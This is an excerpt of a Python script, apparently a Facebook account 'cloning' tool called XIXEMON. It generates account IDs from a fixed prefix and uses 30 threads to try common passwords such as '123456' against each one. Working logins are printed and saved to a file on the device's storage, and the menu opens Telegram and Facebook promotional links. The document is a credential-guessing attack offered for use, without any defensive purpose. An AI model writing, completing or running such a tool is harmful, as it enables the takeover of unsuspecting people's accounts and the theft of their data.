...
os.system('clear')
print('\n\033[1;32m Loading XIXEMON Tools...')
loop = 0 
oks = []
cps = []
gen = []
...
╰━╯╰━┻━━┻━╯╰━┻━━━┻╯╰╯╰┻━━━┻╯╱╰━╯
\033[1;91mXIXEMON
\033[1;32m____________________________________""")
...
def main():
   ...
   # print("[2] RANDOM CLONEv[SOON]");os.system("xdg-open https://t.me/+yTVgZU4cwB8zMDQ1")
    print("[3] START CLONE [XIXEMON]")
#    print("[4] NAGAD HALF INFO[]SOON")
  #  print("[5] NAGAD BAN [SOON]")
    print("\033[1;32m____________________________________""")
...
def fuckMyxAXN(series):
    ____banner____()
    os.system("xdg-open https://www.facebook.com/share/15NvoXHmTo/ ")
    global gen
    if series == "100000":
        SEX = "100000"
        SEX2 = 9
    ...
    with ThreadPoolExecutor(max_workers=30) as Fuck_xnxx:
        ...
        for love in gen:
            ids = SEX + love
            passlist = ["123456", "1234567", "12345678", "123456789"," 123321","1234567890" , " 0987654321"]
...
def Fucking_life(ids, passlist):
    global loop, oks, cps
    sys.stdout.write(f"\rXIXEMON🐾[{loop}]|OK:[{len(cps)}]")
    sys.stdout.flush()
    try:
        for pas in passlist:
            ...
            if "access_token" in response:
                print(f"\r\r\x1bXIXEMON-OK | {ids} • {pas}")
                open("/sdcard/XIXEMON OK .txt", "a").write(ids + "|" + pas + "\n")
                oks.append(ids)
                break
            elif "www.facebook.com" in response.get("error", {}).get("message", ""):
                print(f"\r\r\x1b XIXEMON-OK 🔥🐾 | {ids} • {pas}")
